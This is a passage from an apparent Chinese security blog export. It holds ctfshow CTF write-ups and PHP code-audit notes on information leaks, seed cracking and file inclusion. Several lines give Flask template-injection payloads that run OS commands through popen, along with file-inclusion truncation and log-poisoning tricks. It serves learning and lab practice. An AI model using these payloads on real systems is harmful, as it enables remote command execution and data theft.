class="number">81</span>%E5%<span class="number">87</span>%BD%E6%<span class="number">95</span>%B0%E7%9A%<span class="number">84</span>%E5%B1%9E%E6%<span class="number">80</span>%A7%E3%<span class="number">80</span>%<span class="number">82</span>)getitem()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="string">&#x27;b&#x27;</span>]，就是a.getitem(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">builtins         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="keyword">import</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="keyword">import</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line"><span class="built_in">str</span>()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins，而且url_for.<span class="built_in">globals</span>[<span class="string">&#x27;builtins&#x27;</span>]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins**，而且url_for.**<span class="built_in">globals</span>**[<span class="string">&#x27;**builtins**&#x27;</span>]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.**<span class="built_in">globals</span>**[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="built_in">open</span>函数:request.**init**.**<span class="built_in">globals</span>**[<span class="string">&#x27;**builtins**&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1    get传参</span><br><span class="line">request.values.x1  所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1    post传参(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data   post传参(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json post传json  (Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.**<span class="keyword">class</span>**.**init**.**<span class="built_in">globals</span>**[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>三、常用类</p><p>先举几个基础的例子方便理解：<br>1、<strong>class</strong></p><p>__class__用来查看变量所属的类，格式为变量<code>.__**class__**</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">().__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line">&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">[].__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、<strong>base</strong></p><p>__base__用来查看类的基类，注意是类的基类，所以格式为变量<code>.__**class__**.__**base__**</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">().<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">[].<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>同时也能加上数组，比如变量<code>.__**class__**.__**base__**[0]</code>来获得第一个基类。</p><p>值得一提的是还有个类是<code>__mro__</code>，它会显示类和基类，这是它和<code>__base__</code>的不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><p>3、<strong>subclasses</strong>()</p><p>**<code>subclasses**()</code>查看当前类的子类，格式变量<code>.__**class__**.__**base__**[0].__**subclasses__**()</code><br>这个类也可以加数组来查看指定的索引值，例如变量<code>.__**class__**.__**bases__**[0].__**subclasses__**()[1]</code><br>在这里插入图片描述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>].__subclasses__()[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个时候就可以开始利用类里面的方法了。</p><p>示例：<code>变量.__**class__**.__**bases__**[0].__subclasses__()[138].__**init__**.__**globals__**</code>，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p><p>由此我们可以看到各种各样的参数方法函数，去找一个可利用的function来执行，比如popen的话，就可以这样利用：<code>&#39;&#39;.__**class__**.__**bases__**[0].__**subclasses__**()[138].__**init__**.__**globals__[**&#39;popen&#39;].read()</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/06/26/hello-world/"/>
      <url>/2023/06/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web入门-信息收集</title>
      <link href="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/"/>
      <url>/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/</url>
      
        <content type="html"><![CDATA[<h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><p>靶场&#x2F;来源: ctfshow</p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a><strong>web5</strong></h1><p><strong>题目：</strong></p><p><img src="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image1.png" class="lazyload placeholder" data-srcset="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image1.png"></p><p><strong>解题过程：</strong></p><p>根据提示，这是一道phps源码泄露题，先用御剑扫描，但不知道为什么没扫到。</p><p>百度一下phps源码泄露，发现泄漏点在xxx.phps，访问&#x2F;index.phps，得到源码。</p><p><img src="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image2.png" class="lazyload placeholder" data-srcset="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image2.png"></p><p>获得flag</p><p><strong>知识点：（包括web入门所有题）</strong></p><p>信息收集的一些文件泄露：</p><blockquote><p>1.robots.txt文件泄露，放在网站的根目录下，用于限制浏览器的访问（哪些可以抓取，哪些不能抓取）用于防止黑客，但是任何人可在url中直接通过&#x2F;robots.txt访问，导致网站结构被泄露。可对admin等重要文件设置密保保护，或者采取更换文件名的方法防御.</p><p>2.phps文件泄露，phps存放着php源码,可通过尝试访问&#x2F;index.phps读取,或者尝试扫描工具扫描读取.</p><p>3..git文件泄露，当开发人员使用git控制版本时，如果操作不当，可能导致git流入线上环境，导致.git文件夹下的文件被访问，代码泄露，如.git&#x2F;index文件可找到工程所有文件名和sha1文件,在git&#x2F;objects下载导致危害</p><p>4.svn泄露，svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制）</p><p>5.vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn</p><p>6.压缩文件也可能包含文件的源码等，注意rar zip后缀</p><p>7.通过网站的技术文档什么的，可以知道默认后台路径及密码，比如document.pdf</p><p>8.&#x2F;editor,在editor的flash模块，有一个文件空间，从这里可以看到服务器的目录，里面可能有flag</p><p>9.php探针如：l.php,phpinfo.php,tz.php</p><p>10.mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe。</p></blockquote><p>文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">index.phps</span><br><span class="line">.git</span><br><span class="line">.svn</span><br><span class="line">.index.php.swp</span><br><span class="line">.index.php.swo</span><br><span class="line">.index.php.swn</span><br><span class="line">./editor</span><br><span class="line">document.pdf</span><br><span class="line">l.php</span><br><span class="line">phpinfo.php</span><br><span class="line">tz.php</span><br><span class="line">/db/db.mdb</span><br></pre></td></tr></table></figure><p>信息泄露点：</p><p>1.可以通过网站泄露的qq，手机号码，wx等获得一些信息（地点等）</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web入门-爆破</title>
      <link href="/2023/01/23/ctfshow-web-ru-men-bao-po/"/>
      <url>/2023/01/23/ctfshow-web-ru-men-bao-po/</url>
      
        <content type="html"><![CDATA[<p>靶场&#x2F;来源: ctfshow</p><p><strong>web21</strong></p><p><strong>题目：</strong></p><p>题目提供了一个密码字典，下载即可</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image1.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image1.png"></p><p><strong>解题过程：</strong></p><p>分析抓包，发现根据输入登录用户与密码得不同，Authorization都不同，分析其值 MTExOjIyMg&#x3D;&#x3D; ，判断其为base64编码，对其解码，得到刚才111:222（登录账户:密码），使用burp对其进行爆破，设置如下：</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image2.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image2.png"></p><p>在有效载荷处理处使用前缀名admin:（猜测用户名为admin）,然后进行base64编码</p><p>爆破成功：</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image3.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image3.png"></p><p><strong>知识点：</strong></p><p><strong>web23</strong></p><p><strong>题目：</strong></p><p><code>&lt;?php</code></p><p><code>error_reporting(0);</code></p><p><code>include(&#39;flag.php&#39;);</code></p><p><code>if(isset($_GET[&#39;token&#39;]))&#123; #使用get请求传入一个token</code></p><p><code>$token = md5($_GET[&#39;token&#39;]); #对token进行md5加密</code></p><p><code>#加密后得md5要符合下面一大堆规则，还是使用爆破吧</code></p><p><code>if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</code></p><p><code>if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</code></p><p><code>echo $flag;</code></p><p><code>&#125;</code></p><p><code>&#125;</code></p><p><code>&#125;else&#123;</code></p><p><code>highlight_file(__FILE__);</code></p><p><code>&#125;</code></p><p><code>?&gt;</code></p><p><strong>解题过程：</strong></p><p>抓包</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image4.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image4.png"></p><p>设置规则，使用蛮力破解（因为没有规则可以用）</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image5.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image5.png"></p><p>最后爆破出来为3j</p><p><strong>知识点：</strong></p><p><strong>web24</strong></p><p><strong>题目：</strong></p><?phperror_reporting(0);include("flag.php");$r = $_GET['r']; #使用get请求传入一个rmt_srand(372619038); #mt_srand(播种值)# echo mt_rand();if(intval($r)===intval(mt_rand())){echo $flag;}highlight_file(__FILE__);echo system('cat /proc/version');?><p><strong>解题过程：</strong></p><p>对代码进行审计，发现mt_srand(),百度其用法，发现其如果设置了播种值，mt_rand()每次生成的随机数会相同（伪随机数），所以使用echo mt_rand()对其生成的值进行输出</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image6.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image6.png"></p><p>得到其生成的值</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image7.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image7.png"></p><p>再构造url：地址?r&#x3D;1155388967得到flag</p><p><strong>知识点：</strong></p><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数因此不需要播种，并且如果设置了 seed参数生成的随机数就是伪随机数，意思就是每次生成的随机数是一样的</p><p><strong>web25</strong></p><p><strong>题目：</strong></p><p><code>&lt;?php</code></p><p><code>error_reporting(0);</code></p><p><code>include(&quot;flag.php&quot;);</code></p><p><code>if(isset($_GET[&#39;r&#39;]))&#123;</code></p><p><code>$r = $_GET[&#39;r&#39;];</code></p><p><code>mt_srand(hexdec(substr(md5($flag), 0,8)));</code></p><p><code>$rand = intval($r)-intval(mt_rand());</code></p><p><code>if((!$rand))&#123;</code></p><p><code>if($_COOKIE[&#39;token&#39;]==(mt_rand()+mt_rand()))&#123;</code></p><p><code>echo $flag;</code></p><p><code>&#125;</code></p><p><code>&#125;else&#123;</code></p><p><code>echo $rand; #如果rand不等于0则输出rand</code></p><p><code>&#125;</code></p><p><code>&#125;else&#123; #如果未定义r则输出此文件的源代码</code></p><p><code>highlight_file(__FILE__);</code></p><p><code>echo system(&#39;cat /proc/version&#39;);</code></p><p><code>&#125;</code></p><p><code>?&gt;</code></p><p><strong>解题过程：</strong></p><p>通过分析代码，这里可以令r等于0，从而求出mt_rand()的值（第7行）,注意去除负号</p><p>得出mt_rand()为424485486</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image8.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image8.png"></p><p>接下来就是解决token问题，这里需要对利用生成的随机数对种子进行破解</p><p>#使用php_mt_seed4.0 我们在linux下面使用gcc编译</p><p>gcc php_mt_seed.c -o php_mt_seed</p><p>#之后运行脚本添加随机数</p><p>.&#x2F;php_mt_seed 424485486</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image9.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image9.png"></p><p>可以看到爆出了多个可能的种子，然后用php对其进行一一尝试</p><p><code>&lt;?php</code></p><p><code>error_reporting(0);</code></p><p><code>include(&quot;flag.php&quot;);</code></p><p><code>$data=array(2842768692,119863145,1188895974,1439248936,2480548275,3087409991,4059342533,4224933991);</code></p><p><code>for ($i=0; $i &lt; count($data); $i++) &#123;</code></p><p><code>mt_srand($data[$i]);</code></p><p><code>mt_rand();</code></p><p><code>echo mt_rand()+mt_rand();</code></p><p><code>echo &quot;/&quot;;</code></p><p><code>&#125;</code></p><p><code>?&gt;</code></p><p>运行php得到下列值</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image10.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image10.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image10.png"></p><p>再对其一一尝试</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image11.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image11.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image11.png"></p><p>得到flag</p><p><strong>知识点：</strong></p><p>php_mt_seed下载地址：<a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p><p>mt_rand()面对同一种子在一个函数多次调用的值都不相同，所以不能将mt_rand()+mt_rand()单纯看作mt_rand()*2</p><p><strong>知识点汇总：</strong></p><p><strong>mt_scrand(seed)与mt_rand()伪随机数生成</strong></p><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数因此不需要播种，并且如果设置了 seed参数生成的随机数就是伪随机数，意思就是每次生成的随机数是一样的</p><p>php_mt_seed下载地址：<a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p><p>mt_rand()面对同一种子在一个函数多次调用的值都不相同，所以不能将mt_rand()+mt_rand()单纯看作mt_rand()*2</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《代码审计》阅读笔记</title>
      <link href="/2022/12/23/dai-ma-shen-ji-27f31c56ad1f449fb4d542f939bec05b/"/>
      <url>/2022/12/23/dai-ma-shen-ji-27f31c56ad1f449fb4d542f939bec05b/</url>
      
        <content type="html"><![CDATA[<h1 id="《代码审计》"><a href="#《代码审计》" class="headerlink" title="《代码审计》"></a>《代码审计》</h1><p>备注: php代码审计<br>开始日期: December 23, 2022 5:09 PM<br>状态: 已完成</p><h1 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h1><ol><li>根据敏感关键字回溯参数传递过程</li><li>查找可控变量，正向追踪变量传递过程</li><li>寻找敏感功能点，通读功能点代码</li><li>直接通读全文代码</li></ol><p>一般流程：</p><ol><li>拿到源代码文件夹，先从根目录开始，查找有没有敏感文件名，如：</li></ol><ul><li>index，API，include</li><li>配置文件：config</li><li>函数集文件：function，common</li><li>安全过滤文件：filter，safe，check</li></ul><p>然后再一层一层这样子通读一下文件名。</p><p>敏感函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()   <span class="comment">#过滤函数，对单引号，双引号，NULL字符，以及斜杆进行转义过滤</span></span><br><span class="line">mysql_real_escape_string <span class="comment">#过滤函数，过滤\x00,\n,\r,\,&#x27;,&quot;,\x1a</span></span><br></pre></td></tr></table></figure><h1 id="PHP配置"><a href="#PHP配置" class="headerlink" title="PHP配置"></a>PHP配置</h1><p>PHP_INI_*常量的定义</p><table><thead><tr><th>常量</th><th>含义</th></tr></thead><tbody><tr><td>PHP_INI_USER</td><td>可在PHP脚本或windows注册表中设置</td></tr><tr><td>PHP_INI_PERDIR</td><td>可在php.ini,.htaccess或httpd,conf中设置</td></tr><tr><td>PHP_INI_SYSTEM</td><td>可在php.ini或httpd,conf中设置</td></tr><tr><td>PHP_INI_ALL</td><td>可在任何地方设置</td></tr><tr><td>php.ini only</td><td>仅可在php.ini中设置</td></tr></tbody></table><ol><li>register_global（全局注册开关）</li></ol><p>适用版本：php&lt;5.4</p><p>该选项设置为on时，会直接把用户GET，POST等方式提交上来的参数直接注册成全局变量并初始化值为参数对应的值，如提交一个?a&#x3D;xxx，则可以直接使用$a代替$_GET[a],</p><ol><li>allow_url_include（是否允许包含远程文件）</li></ol><p>适用版本：php&lt;5.2之后默认关闭</p><ol><li>magic_quotes_gpc与magic_quotes_gpc （皆为魔术引号自动过滤）</li></ol><p>适用版本：php&lt;5.4</p><p>自动过滤单引号，双引号，反斜杠和NULL，区别在于前者针对GET,POST,COOKIE；而后者针对从数据库或者文件中获取的数据进行过滤</p><ol><li>安全模式</li></ol><p>适用版本：php&lt;5.4</p><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><ul><li>注意与数据库交互的函数，语句，然后查看他们的过滤情况</li></ul><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>关键字：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES</span><br><span class="line">character_set_client=gbk</span><br><span class="line">mysql_set_charset</span><br></pre></td></tr></table></figure><h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h2><p>找带有参数的输出函数，然后根据输出函数对输入内容回溯输入参数</p><h2 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3.CSRF"></a>3.CSRF</h2><p>token验证：token一般为访问上一个页面得到的，如果没有访问上一个页面而是通过跳转而来的，则验证失败</p><h2 id="4-文件操作漏洞"><a href="#4-文件操作漏洞" class="headerlink" title="4.文件操作漏洞"></a>4.文件操作漏洞</h2><h3 id="文件包含："><a href="#文件包含：" class="headerlink" title="文件包含："></a>文件包含：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br></pre></td></tr></table></figure><p>本地文件包含：可以包含自己上传的文件，也可以包含本地的日志，如linux在User-Agent头写入木马，然后包含&#x2F;proc&#x2F;self&#x2F;environ</p><p>远程文件包含：可以直接包含一个1含有木马的.txt。</p><p>通常会使用截断进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[a].<span class="string">&quot;.php&quot;</span></span><br></pre></td></tr></table></figure><p>如：</p><ol><li>%00截断，php&lt;5.3</li><li>Windows下使用240个.或.加&#x2F;，Linux下使用2038个.&#x2F;进行截断</li><li>远程包含时使用?进行绕过，?url&#x3D;xxx.com&#x2F;1.txt?</li></ol><h3 id="文件读取（下载）漏洞"><a href="#文件读取（下载）漏洞" class="headerlink" title="文件读取（下载）漏洞"></a>文件读取（下载）漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件读取函数列表</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight</span>()</span><br><span class="line"><span class="title function_ invoke__">forpen</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"><span class="title function_ invoke__">parse_ini_file</span>()</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line">除了使用这些正常的读取文件的函数之外，还可以使用 <span class="keyword">include</span>+伪协议 来读取文件</span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>() <span class="comment">#唯一一个文件上传函数，所以在代码审计时可以直接查找这个函数，然后再看能不能绕过</span></span><br></pre></td></tr></table></figure><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unlink</span>()  <span class="comment">#文件删除</span></span><br></pre></td></tr></table></figure><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>() <span class="comment">#从数组中将变量导入到当前的符号表</span></span><br><span class="line"><span class="title function_ 